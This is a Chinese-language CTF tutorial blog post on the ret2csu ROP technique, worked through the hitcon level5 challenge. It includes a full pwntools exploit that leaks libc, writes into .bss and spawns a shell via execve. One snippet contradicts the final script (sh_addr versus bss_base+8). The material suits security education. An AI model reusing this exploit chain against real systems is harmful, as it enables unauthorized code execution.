---
title: 中级ROP：ret2csu
tags:
  - pwn
  - ROP
  - ret2csu
categories:
  - - pwn
    - Linux用户态
    - 栈溢出
excerpt:
  - ret2csu是一种在x86_64 Linux程序中，当常用ROP gadget（如pop rdi; ret）缺失时的强大利用技术。它通过挖掘glibc初始化函数__libc_csu_init中固有的两段指令序列，实现对rdi、rsi、rdx等关键参数寄存器的间接控制。典型攻击分为三步：首次调用泄露libc基址；第二次调用向.bss段写入数据（如execve地址与"/bin/sh"）；最终调用执行shell。该技术因代码片段广泛存在于glibc<2.34的程序中而具有很高可靠性，是中级ROP攻击的重要组成。
date: 2026-02-04 17:51:58
cover: /images/banner-7.webp
banner: /images/banner-8.webp
---

# ret2csu

> 参考资料
>
> CTF Wiki - [ret2csu](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)

## 0x01 原理

我们得知，Linux上的x86_64架构的程序遵循**System V AMD64 ABI**函数调用约定，即函数的前6个参数使用寄存器传参，所以，在我们构建ROP链时，需要找到可以控制寄存器的gadgets，但是在大多数情况下，我们很难找到每一个寄存器对应的gadgets。

如果你有自己尝试过构建一个需要使用`ret2libc`的程序，你会发现，自己构建的程序可能找不见`pop rdi; ret`等常用gadgets，这种情况是正常的。出题人一般会专门写一个不会使用的函数，用来放这种gadgets。~~不然我就不会做了~~

所以说，正是因为能直接控制所有寄存器的gadgets稀缺，我们才需要找到在程序中天然存在的，能一次性设置多个寄存器的gadgets片段，比如本文接下来要提到的`__libc_csu_init`函数。

### __libc_csu_init

`__libc_csu_init`(CSU == C Startup)，其本质为 glibc 启动代码中，在`main()`之前执行的一段“程序级初始化器”，其负责调用`init_array`中的相关函数，然后回到`__libc_start_main` 去调用应用的 `main`。如果你对相关的流程不熟悉，可以将其理解为一个初始化函数。

对于漏洞利用而言，这个函数的关键价值在于：在使用glibc(glibc<2.34[^1])的x86_64 Linux 程序中，它几乎必然存在——无论是动态链接还是静态链接。如下是该函数的汇编指令序列（不同版本的glibc可能略有不同）：

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp

```

该段函数宏，我们主要能利用如下几个片段：

```assembly
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
```

这里有一段连续的`pop`，这意味着我们可以先通过栈溢出和我们布置到栈中的内容控制`rbx rbp r12 r13 r14 r15`这几格寄存器的值。

```assembly
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
```

将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，**但其实此时 rdi 的高 32 位寄存器值为 0**，相当于控制rdi，只不过只有低32位。而这三个寄存器，正是**System V AMD64 ABI**函数调用约定中用来存放前三个参数的寄存器。

同时，可以注意到，通过控制 `r12` 和 `rbx`，我们可以利用 `call qword ptr [r12+rbx*8]` 间接调用任意函数。通常设置 `rbx=0`，`r12` 则设置为**目标函数指针所在的地址**（例如某个GOT表项地址）。执行时，CPU会读取 `[r12]` 处的8字节值作为目标地址进行跳转。

```assembly
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
```

我们可以控制 rbx 和 rbp 的值，如果 rbx+1 == rbp，程序则会执行该段汇编下方的汇编。一般来说，我们会让rbx=0，rbp=1。

## 0x02 示例

此处以 [hitcon level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2__libc_csu_init/hitcon-level5)为例

检查保护
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

该程序逻辑非常简单，存在一个明显的栈溢出漏洞：`vulnerable_function` 中 `read` 可读取 `0x200` 字节，但缓冲区 `buf` 仅有 `128` 字节。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  vulnerable_function(1LL);
  return 0;
}
```

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```

> 本程序是所依赖的库是glibc 2.23。但是在本地更换libc依赖后，该程序无法运行。当glibc 版本 > 2.27时其可以正常运行。
>
> 由于环境的问题，我无法在本机环境上无法通过调用 system("/bin/sh") 来 getshell，所以这里用了和CTF Wiki上一样的方法

基本思路如下：

1. 利用ret2csu泄露libc地址，获取 execv 和 /bin/sh 的地址
2. 再次利用ret2csu将 execv_addr ，"/bin/sh\x00"写入bss段内
3. 再次利用ret2csu执行 execve("/bin/sh", 0, 0)

### 泄露libc地址

辅助函数

```python
def csu(rbx: int, rbp: int, r12: int, r13: int, r14: int, r15: int, r_addr: int, padding: int):
    payload = b'a' * (padding)
    payload += p64(0x000000000040061A)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(0x0000000000400600)
    payload += b'a' * 0x38
    payload += p64(r_addr)

    sd(payload)
```

用于快速组装payload和发送，布置好的栈帧示意图：
```text
| ...                          | 低地址
| ‘a’ * padding                | <- 填充至返回地址
| 0x40061A (pop链起始地址)       | <- 覆盖的返回地址
| rbx值                        |
| rbp值                        |
| r12值 (函数指针地址)           |
| r13值 (->rdx)                |
| r14值 (->rsi)                |
| r15值 (->edi)                |
| 0x400600 (mov链起始地址)      | <- pop链ret后跳转至此
| ‘a’ * 0x38 (填充)            | <- 用于add rsp, 8和6个pop的栈空间。
| r_addr (下一个返回地址)        | <- mov链ret后跳转至此
| ...                         | 高地址
```

脚本主逻辑：

```python
    ru(b"Hello, World\n")
    # debug()
    csu(0, 1, write_got, 8, write_got, 1, main_addr, 0x88)
```

这里我们实际上是构造了`write(1, write, 8)`这样一个函数，其会将got表中 write 的真实地址输出出来。

```python
	write_addr = u64(rc(8))
    lg("write_addr: " + hex(write_addr))

    libc_base = write_addr - libc.sym['write']
    exe_addr = libc_base + libc.sym['execve']
    sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    lg("libc_base: " + hex(libc_base))
    lg("exe_addr: " + hex(exe_addr))
    lg("sh_addr: " + hex(sh_addr))
```

脚本接收并解析

### 向.bss段写入

`.bss` 段是 ELF 中用于存放**未初始化的全局/静态变量**的内存区域，程序加载时会为其分配空间并**自动清零**。在利用中它常被选作数据落点：在非 PIE 场景下其地址通常**固定且易于计算**，便于稳定地引用；同时 `.bss` 往往**空间充足**、写入不易干扰程序已有的初始化数据（相比覆盖 `.data`/栈更不容易破坏逻辑）；此外其**初始全 0** 的特性非常适合构造以 `NULL` 结尾的字符串/数组或作为默认空指针字段，从而减少额外写入与构造成本。

```python
bss_base = e.bss()
ru(b"Hello, World\n")
csu(0, 1, read_got, 16, bss_base, 0, main_addr, 0x88)
sd(p64(exe_addr) + b'/bin/sh\x00')
```

这里构造的是`read(0, bss_base, 16)`，向 .bss 段内读入16字节数据，然后脚本发送 execve_addr 和 "/bin/sh\x00" 给程序写入 bss段内。

在这里，有人会有疑问，**为何需要多此一举，而不直接使用libc中的`/bin/sh`地址？** 这是因为我们只能通过`r15d`设置`edi`，从而控制`rdi`的低32位（高32位被清零）。libc的映射地址通常很高（远超`2^32`），而.bss段的地址较低，能容纳在32位范围内。从下方地址输出对比中即可看出：
```bash
[+] bss_base: 0x601040       # 32位可表示
[+] write_addr: 0x7ff7b59100f0 # 远超32位
```

并不是画蛇添足。

### 执行 execve("/bin/sh", 0, 0)

```python
csu(0, 1, bss_base, 0, 0, sh_addr, main_addr, 0x88)
```

这里构造的是`execve("/bin/sh",0, 0)`

### 完整EXP

```python
#!/bin/python
# _*_ coding: utf-8 _*_

from pwn import *

context(arch = 'amd64', os = 'linux')
context.terminal = ['konsole', '-e']
context.log_level = 'debug'
context.binary = './task05'
e = ELF('./task05')
# libc = e.libc
libc = ELF('./libc-2.27.so')
host = "127.0.0.1"
post = 60005
if args['RE']:
    io = remote(host, post)
else:
    io = process('./task05')

def debug():
    gdb.attach(io)
    pause()

# ===== lambda =====
sa  = lambda s, d: io.sendafter(s, d)       # send after
sla = lambda s, d: io.sendlineafter(s, d)   # sendline after  
sl  = lambda d:    io.sendline(d)           # sendline
sd  = lambda d:    io.send(d)               # send
ru  = lambda s:    io.recvuntil(s)          # recvuntil
rc  = lambda n:    io.recv(n)               # recv n bytes
rl  = lambda :     io.recvline()            # recvline
ti  = lambda :     io.interactive()         # interactive
lg  = lambda s, v:    log.info('\033[1;32m %s --> 0x%x \033[0m' % (s, v))

def csu(rbx: int, rbp: int, r12: int, r13: int, r14: int, r15: int, r_addr: int, padding: int):
    payload = b'a' * (padding)
    payload += p64(0x000000000040061A)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(0x0000000000400600)
    payload += b'a' * 0x38
    payload += p64(r_addr)

    sd(payload)

# ===== main =====
def main():
    write_got = e.got['write']
    read_got = e.got['read']
    bss_base = e.bss()
    lg("bss_base: ", bss_base)
    main_addr = e.sym['main']

    ru(b"Hello, World\n")
    # debug()
    csu(0, 1, write_got, 8, write_got, 1, main_addr, 0x88)

    write_addr = u64(rc(8))
    lg("write_addr: ", write_addr)

    libc_base = write_addr - libc.sym['write']
    exe_addr = libc_base + libc.sym['execve']
    sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    lg("libc_base: ", libc_base)
    lg("exe_addr: ", exe_addr)
    lg("sh_addr: ", sh_addr)

    ru(b"Hello, World\n")
    csu(0, 1, read_got, 16, bss_base, 0, main_addr, 0x88)
    sd(p64(exe_addr) + b'/bin/sh\x00')

    csu(0, 1, bss_base, 0, 0, bss_base+8, main_addr, 0x88)

# ===== exec =====
if __name__ == '__main__':
    main() 
    ti()
```

[^1]:在glibc 2.34之后，该符号已被移除或被更改，其职责被启动链路中的其它部分替代。



---

>**版权与引用声明**
>
>**本文部分内容基于以下外部材料：**
>
>- **来源**：CTF Wiki - [ret2csu](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)
>- **原作者**：CTF Wiki 社区贡献者
>- **许可协议**：该部分内容遵循 **[知识共享 署名-非商业性使用-相同方式共享 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/)** 提供。
>- **使用方式**：本文对原文进行了选择性摘录和格式转换，未进行实质性修改。
>- **完整声明**：本文整体同样遵循 CC BY-NC-SA 4.0 协议发布
